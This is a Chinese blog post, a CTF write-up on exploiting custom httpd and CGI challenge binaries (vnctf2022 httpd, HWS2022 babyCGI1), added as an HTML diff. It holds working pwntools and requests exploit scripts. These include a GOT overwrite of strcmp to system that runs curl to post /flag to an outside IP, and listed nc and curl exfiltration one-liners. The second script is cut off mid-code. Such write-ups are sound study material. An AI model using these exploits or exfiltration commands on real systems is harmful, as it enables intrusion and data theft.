@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang='zh-CN'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.1">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>webpwn Httpd类型学习 - 1m0tfl</title>
+
+  
+    <meta name="description" content="看了点httpd类型的题目,这里简单总结两个 vnctf2022 httpd和 HWS2022 babyCGI1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="webpwn Httpd类型学习">
+<meta property="og:url" content="https://www.tmotfl.top/2022/04/04/webpwn-Httpd%E7%B1%BB%E5%9E%8B%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="1m0tfl">
+<meta property="og:description" content="看了点httpd类型的题目,这里简单总结两个 vnctf2022 httpd和 HWS2022 babyCGI1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20220404221405354.png">
+<meta property="og:image" content="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20220404190810715.png">
+<meta property="og:image" content="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20220404191334392.png">
+<meta property="og:image" content="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20220404192532146.png">
+<meta property="og:image" content="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20220404194807499.png">
+<meta property="article:published_time" content="2022-04-04T14:23:30.000Z">
+<meta property="article:modified_time" content="2022-04-04T14:26:36.248Z">
+<meta property="article:author" content="1m0tfl">
+<meta property="article:tag" content="webpwn">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20220404221405354.png">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/xxy1126.github.io/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/xxy1126.github.io/about/"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://avatars.githubusercontent.com/u/36330256?s=400&u=6a1ecd579f578df9afac5d18f47780fb6ee8c083&v=4" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/xxy1126.github.io/"><div class="main">1m0tfl</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/xxy1126.github.io/">文章</a><a class="nav-item" href="/xxy1126.github.io/friends/">友链</a><a class="nav-item" href="/xxy1126.github.io/about/">关于</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">本文目录</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Ehttpd"><span class="toc-text">关于httpd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vnctf2022-httpd"><span class="toc-text">vnctf2022 httpd</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-text">非预期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F"><span class="toc-text">预期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HWS2022-babyCGI1"><span class="toc-text">HWS2022 babyCGI1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#game-cgi"><span class="toc-text">game.cgi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag-cgi"><span class="toc-text">flag.cgi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol></div></div></div>
+
+
+</div>
+
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/xxy1126.github.io/">主页</a><span class="sep"></span><a class="cap breadcrumb" href="/xxy1126.github.io/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/xxy1126.github.io/categories/pwn/">pwn</a></div><div id="post-meta">发布于&nbsp;<time datetime="2022-04-04T14:23:30.000Z">2022-04-04</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>webpwn Httpd类型学习</span></h1>
+<p>看了点httpd类型的题目,这里简单总结两个 vnctf2022 httpd和 HWS2022 babyCGI1 </p>
+<span id="more"></span> 
+<h2 id="关于httpd"><a href="#关于httpd" class="headerlink" title="关于httpd"></a>关于httpd</h2><p>github上有一个经典的tinyhttpd项目, 写一下的话会对逆这种题目有很大帮助. </p>
+<p>这类题目比较特殊, 和httpd是通过套接字描述符进行交互, 直接让httpd执行system(“/bin/sh”)的话会没有回显, 所以一般有一下几种利用方式. </p>
+<p>还有就是这类题目可以多次连接, 适合利用爆破来绕过一些限制. </p>
+<p>题目漏洞的话栈溢出,格式化字符串比较常见, 堆比较少, 还有就是一些逻辑洞, 整数溢出之类的. </p>
+<ul>
+<li>反弹shell <ul>
+<li>可以参考<a target="_blank" rel="noopener" href="https://brucetg.github.io/2018/05/03/%E5%A4%9A%E7%A7%8D%E5%A7%BF%E5%8A%BF%E5%8F%8D%E5%BC%B9shell/">博客</a></li>
+</ul>
+</li>
+<li>利用nc或curl把flag传到自己的服务器 <ul>
+<li><code>curl -X POST -F \&quot;flag=@/flag\&quot;x.x.x.x:2000</code></li>
+<li><code>cat flag | nc x.x.x.x 2000</code></li>
+</ul>
+</li>
+<li>利用orw读取flag, 通过socket传输回客户端 </li>
+<li>利用<code>dup2</code>重定向httpd的输入输出为socket, 执行<code>system(“/bin/sh”)</code>进行交互</li>
+</ul>
+<h2 id="vnctf2022-httpd"><a href="#vnctf2022-httpd" class="headerlink" title="vnctf2022 httpd"></a>vnctf2022 httpd</h2><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>在判断文件存在的分支中没有检查<code>..</code>, 导致可以利用路径穿越来直接读取到<code>flag</code> </p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20220404221405354.png" alt="image-20220404221405354"></p>
+<h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><p>在<code>sub_1EB2</code>函数中是函数主要逻辑, 存在任意地址写以及任意地址读的漏洞 ,这不多说, 主要还是说怎么拿到flag. </p>
+<p>前面说过几种方法, 这个题可以修改strcmp的got表为system, 利用system实现任意命令执行,</p>
+<p><code>curl -X POST -F \&quot;flag=@/flag\&quot; 101.35.137.103:2000</code>把flag传送到自己的服务器, 在服务器上<code>nc -l 2000</code></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line"></span><br><span class="line">context(log_level = &#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">def request(content): </span><br><span class="line">	offset = len(content)%3</span><br><span class="line">	if offset !=0: </span><br><span class="line">		content += (3-offset)*&#x27;\x00&#x27;</span><br><span class="line">	data = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">	for i in range(0, len(content), 3): </span><br><span class="line">		x = ord(content[i])</span><br><span class="line">		y = ord(content[i+1])</span><br><span class="line">		z = ord(content[i+2])</span><br><span class="line">		a = x &gt;&gt; 2 </span><br><span class="line">		b = (x&amp;0x3)&lt;&lt;4 | y&gt;&gt;4 </span><br><span class="line">		c = (y&amp;0xF)&lt;&lt;2 | z&gt;&gt;6 </span><br><span class="line">		d = z&amp;0x3F</span><br><span class="line">		for k in (a, b, c, d): </span><br><span class="line">			data += chr(table.index(k))</span><br><span class="line">	payload = &#x27;&#x27;</span><br><span class="line">	payload += &#x27;GET /submit.cgi?&#123;&#125;\r\n\n&#x27;.format(data)</span><br><span class="line">	return payload</span><br><span class="line">def pack(opt, dword1, dword2, dword3): </span><br><span class="line">	payload = p32(opt)+p64(dword1)+p64(dword2)+p64(dword3)</span><br><span class="line">	return payload</span><br><span class="line"></span><br><span class="line">libc = ELF(&#x27;./local.so&#x27;)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">table = [</span><br><span class="line">  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, </span><br><span class="line">  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, </span><br><span class="line">  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, </span><br><span class="line">  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, </span><br><span class="line">  0xFF, 0xFF, 0xFF, 0x3E, 0xFF, 0xFF, 0xFF, 0x3F, 0x34, 0x35, </span><br><span class="line">  0x36, 0x37, 0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0xFF, 0xFF, </span><br><span class="line">  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x01, 0x02, 0x03, 0x04, </span><br><span class="line">  0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, </span><br><span class="line">  0x0F, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, </span><br><span class="line">  0x19, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x1A, 0x1B, 0x1C, </span><br><span class="line">  0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, </span><br><span class="line">  0x27, 0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, </span><br><span class="line">  0x31, 0x32, 0x33, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF</span><br><span class="line">]</span><br><span class="line">p = remote(&#x27;127.0.0.1&#x27;, 4000)</span><br><span class="line">p.send(request(p32(1)+pack(0x66, 0, 0, 0)))</span><br><span class="line">p.recvuntil(&#x27;0x&#x27;)</span><br><span class="line">piebase = int(p.recvuntil(&#x27; &#x27;, drop = True), 16) - 0x4008</span><br><span class="line">log.success(&#x27;piebase: &#x27; + str(hex(piebase)))</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;127.0.0.1&#x27;, 4000)</span><br><span class="line">iostdout = piebase + 0x6180</span><br><span class="line">p.send(request(p32(1)+pack(0x88, iostdout, 0, 0)))</span><br><span class="line">p.recvuntil(&#x27;0x&#x27;)</span><br><span class="line">libcbase = int(p.recvuntil(&#x27;\n&#x27;, drop = True), 16) - libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]</span><br><span class="line">log.success(&#x27;libcbase: &#x27; + str(hex(libcbase)))</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;127.0.0.1&#x27;, 4000)</span><br><span class="line">p.send(request(p32(2)+pack(0xF1, piebase+elf.got[&#x27;strcmp&#x27;], 0, libcbase+libc.symbols[&#x27;system&#x27;])+p32(0x22)+&#x27;curl -X POST -F \&quot;flag=@/flag\&quot; 101.35.137.103:2000&#x27;+&#x27;\x00&#x27;))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="HWS2022-babyCGI1"><a href="#HWS2022-babyCGI1" class="headerlink" title="HWS2022 babyCGI1"></a>HWS2022 babyCGI1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">iot@ubuntu:~/BabyCGI1的附件$ tree .</span><br><span class="line">.</span><br><span class="line">├── Dockerfile</span><br><span class="line">├── pow.py</span><br><span class="line">├── qemu-system-arm</span><br><span class="line">├── rootfs.ext2</span><br><span class="line">├── start-qemu.sh</span><br><span class="line">├── vexpress-v2p-ca9.dtb</span><br><span class="line">└── zImage</span><br></pre></td></tr></table></figure>
+<p>可以从rootfs.ext2中提取出httpd文件, 在start-qemu.sh脚本中开启1234端口 进行gdb调试. </p>
+<p>比赛的时候这一个程序可以交两个flag, 分别pwn掉flag.cgi和cgipwn.cgi获得不同的flag, 这里只分析flag.cgi  </p>
+<p>调用<code>flag.cgi</code>和<code>cgipwn.cgi</code>需要获得<code>token</code>, 而通过<code>game.cgi</code>就可以得到<code>token</code>. </p>
+<h3 id="game-cgi"><a href="#game-cgi" class="headerlink" title="game.cgi"></a>game.cgi</h3><p><code>game.cgi</code>首先根据2字节的随机数生成迷宫, 根据<code>POST</code>传入的参数<code>step</code>走迷宫, 成功通过迷宫就可以输出<code>token</code>. </p>
+<p>这种带有随机数的题目都会想到看能否够控制<code>seed</code>. </p>
+<p><code>local_username</code>和<code>seed</code>变量在栈上是相邻的, <code>strcpy</code>函数会在dst字符串后面添加<code>\x00</code>, 如果让<code>username</code>的长度为0x20, 也就是会有一个offbynull, 那么种子可能的数量就只有256种, 随便选一个记录下路径来进行爆破即可, 概率为<code>1/256</code>. </p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20220404190810715.png" alt="image-20220404190810715"></p>
+<h3 id="flag-cgi"><a href="#flag-cgi" class="headerlink" title="flag.cgi"></a>flag.cgi</h3><p>在获得<code>token</code>之后, 在向httpd发送报文的时候添加token就可以进入<code>flag.cgi</code>. </p>
+<p><code>flagcgi</code>会把输入经过一些变换之后和<code>secret</code>进行比较,相同就会输出<code>flag</code>. </p>
+<p>主要变换流程如下:</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20220404191334392.png" alt="image-20220404191334392"></p>
+<ol>
+<li><p><code>memcpy(v22, v23, 3), memcpy(v22, &amp;BYTE101, 3), memcpy(v25, &amp;BYTE01010, 5)</code> 规定了<code>flag.cgi</code>的输入形式为<code>101xxxxxxxx01010xxxxxxxxx101</code> </p>
+<p>其中两段<code>xxx</code>的数量为42, 通过分析后面三个函数可以了解到是一个<code>6*7</code>的矩阵. </p>
+</li>
+<li><p><code>sub_6CA4</code>函数校验第一段xxxx 结合后面语句 <code>v28[0] = v18+0x30</code>可以了解, <code>sub_6CA4</code>函数的返回值就是<code>secret</code>的第一位 </p>
+<p>函数内部是把每一行的01序列加起来求奇偶, 然后在给定的序列中查找是否匹配, 如果匹配的话就返回对应的序号, 一共给了10组</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20220404192532146.png" alt="image-20220404192532146"></p>
+</li>
+<li><p><code>sub_6E14</code>函数也是校验第一段xxx, 根据每一行的奇偶性 把每一行的01序列和给定01序列进行匹配, 匹配到的话就返回对应的序号 </p>
+</li>
+<li><code>sub_6FE0</code>函数校验第二段xxx, 不根据奇偶性, 直接把每一行的01序列和给定序列进行匹配. </li>
+</ol>
+<p>漏洞出现在输出<code>wrong password</code>的地方, 在输出<code>v28</code>的时候会把<code>v29</code>顺带出来, 也就是可以知道当前匹配到哪一位, 可以进行逐位爆破(类似 <code>pwnable.tw</code>一道绕过canary的栈题)</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20220404194807499.png" alt="image-20220404194807499"></p>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"></span><br><span class="line">flagcgi = <span class="string">&#x27;http://127.0.0.1:8080/flag.cgi&#x27;</span> </span><br><span class="line">gamecgi = <span class="string">&#x27;http://127.0.0.1:8080/game.cgi&#x27;</span> </span><br><span class="line">token = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#bypass game.cgi and get token   </span></span><br><span class="line">username = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> </span><br><span class="line">step = <span class="string">&#x27;dsssdsssasssssdsssdssasassddddwwwdwwawwwdwdddsssdsdsssassddwdddwwawwawwddsddsssddssdsd&#x27;</span> </span><br><span class="line">postdata = <span class="string">&#x27;username=&#x27;</span>+username+<span class="string">&#x27;&amp;step=&#x27;</span>+step </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x500</span>): </span><br><span class="line">	 recvdata = requests.post(gamecgi, data = postdata) </span><br><span class="line">	 <span class="built_in">print</span>(<span class="string">&#x27;[*]times: &#x27;</span> + <span class="built_in">str</span>(i)) </span><br><span class="line">	 <span class="keyword">if</span> <span class="string">&#x27;Great!&#x27;</span> <span class="keyword">in</span> recvdata.text: </span><br><span class="line">		 token = recvdata.text[<span class="number">115</span>:<span class="number">115</span>+<span class="number">0x40</span>] </span><br><span class="line">		 <span class="built_in">print</span>(<span class="string">&#x27;[*]token: &#x27;</span> + token)</span><br><span class="line">		 <span class="keyword">break</span>    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(token))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#hack flagcgi </span></span><br><span class="line">flagcgi_header = &#123;<span class="string">&#x27;token&#x27;</span>: token&#125; </span><br><span class="line">evenodd1 = [<span class="string">&#x27;111111&#x27;</span> ,<span class="string">&#x27;110100&#x27;</span> ,<span class="string">&#x27;110010&#x27;</span> ,<span class="string">&#x27;110001&#x27;</span> ,<span class="string">&#x27;101100&#x27;</span> ,<span class="string">&#x27;100110&#x27;</span> ,<span class="string">&#x27;100011&#x27;</span> ,<span class="string">&#x27;101010&#x27;</span> ,<span class="string">&#x27;101001&#x27;</span> ,<span class="string">&#x27;100101&#x27;</span>]</span><br><span class="line">even1 = [<span class="string">&#x27;0100111&#x27;</span>,<span class="string">&#x27;0110011&#x27;</span>,<span class="string">&#x27;0011011&#x27;</span>,<span class="string">&#x27;0100001&#x27;</span>,<span class="string">&#x27;0011101&#x27;</span>,<span class="string">&#x27;0111001&#x27;</span>,<span class="string">&#x27;0000101&#x27;</span>,<span class="string">&#x27;0010001&#x27;</span>,<span class="string">&#x27;0001001&#x27;</span>,<span class="string">&#x27;0010111&#x27;</span>] </span><br><span class="line">odd1 = [<span class="string">&#x27;0001101&#x27;</span> ,<span class="string">&#x27;0011001&#x27;</span>,<span class="string">&#x27;0010011&#x27;</span>,<span class="string">&#x27;0111101&#x27;</span>,<span class="string">&#x27;0100011&#x27;</span>,<span class="string">&#x27;0110001&#x27;</span>,<span class="string">&#x27;0101111&#x27;</span>,<span class="string">&#x27;0111011&#x27;</span>,<span class="string">&#x27;0110111&#x27;</span>,<span class="string">&#x27;0001011&#x27;</span>] </span><br><span class="line">totl2 = [<span class="string">&#x27;1110010&#x27;</span>,<span class="string">&#x27;1100110&#x27;</span>,<span class="string">&#x27;1101100&#x27;</span>,<span class="string">&#x27;1000010&#x27;</span>,<span class="string">&#x27;1011100&#x27;</span>,<span class="string">&#x27;1001110&#x27;</span>,<span class="string">&#x27;1010000&#x27;</span>,<span class="string">&#x27;1000100&#x27;</span>,<span class="string">&#x27;1001000&#x27;</span>,<span class="string">&#x27;1110100&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">##find first bit</span></span><br><span class="line">idxevenodd = <span class="number">0</span> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>): </span><br><span class="line">	postdata = <span class="string">&#x27;101&#x27;</span> </span><br><span class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> evenodd1[i]: </span><br><span class="line">		<span class="keyword">if</span> k == <span class="string">&#x27;1&#x27;</span>: </span><br><span class="line">			postdata += odd1[<span class="number">0</span>] </span><br><span class="line">		<span class="keyword">else</span>: </span><br><span class="line">			postdata += even1[<span class="number">0</span>]</span><br><span class="line">	postdata += <span class="string">&#x27;01010&#x27;</span> </span><br><span class="line">	postdata += totl2[<span class="number">0</span>]*<span class="number">6</span></span><br><span class="line">	postdata += <span class="string">&#x27;101&#x27;</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;[*]fuck evenodd: &#x27;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">	recvdata = requests.post(flagcgi, headers = flagcgi_header, data = postdata)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;data: &#x27;</span> + recvdata.text)</span><br><span class="line">	idx = recvdata.text[<span class="number">77</span>:<span class="number">78</span>]</span><br><span class="line">	<span class="comment">#print(&#x27;idx:&#x27; + idx)</span></span><br><span class="line">	<span class="keyword">if</span> idx ==<span class="string">&#x27;\x01&#x27;</span>: </span><br><span class="line">		idxevenodd = i </span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;[*]find first bit: &#x27;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">		<span class="keyword">break</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">evenodd = evenodd1[idxevenodd] </span><br><span class="line">secret = <span class="string">&#x27;101&#x27;</span></span><br><span class="line"><span class="comment">##find fisrt segment 6 bit </span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------------------------first second&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> fuckidx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">6</span>):   </span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;[*]fuck idx:&#x27;</span> + <span class="built_in">str</span>(fuckidx))</span><br><span class="line">	<span class="keyword">for</span> selectidx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>): </span><br><span class="line">		postdata = secret</span><br><span class="line">		nowdata = <span class="string">&#x27;&#x27;</span></span><br><span class="line">		<span class="keyword">if</span> evenodd[fuckidx] == <span class="string">&#x27;1&#x27;</span>: </span><br><span class="line">			nowdata += odd1[selectidx] </span><br><span class="line">		<span class="keyword">else</span>: </span><br><span class="line">			nowdata += even1[selectidx] </span><br><span class="line">		postdata += nowdata </span><br><span class="line">		<span class="keyword">for</span> idx, k <span class="keyword">in</span> <span class="built_in">enumerate</span>(evenodd): </span><br><span class="line">			<span class="keyword">if</span> idx&gt;fuckidx: </span><br><span class="line">				<span class="keyword">if</span> k == <span class="string">&#x27;1&#x27;</span>: </span><br><span class="line">					postdata += odd1[<span class="number">0</span>]</span><br><span class="line">				<span class="keyword">else</span>: </span><br><span class="line">					postdata += even1[<span class="number">0</span>] </span><br><span class="line"></span><br><span class="line">		postdata += <span class="string">&#x27;01010&#x27;</span> </span><br><span class="line">		postdata += totl2[<span class="number">0</span>]*<span class="number">6</span> </span><br><span class="line">		postdata += <span class="string">&#x27;101&#x27;</span> </span><br><span class="line">		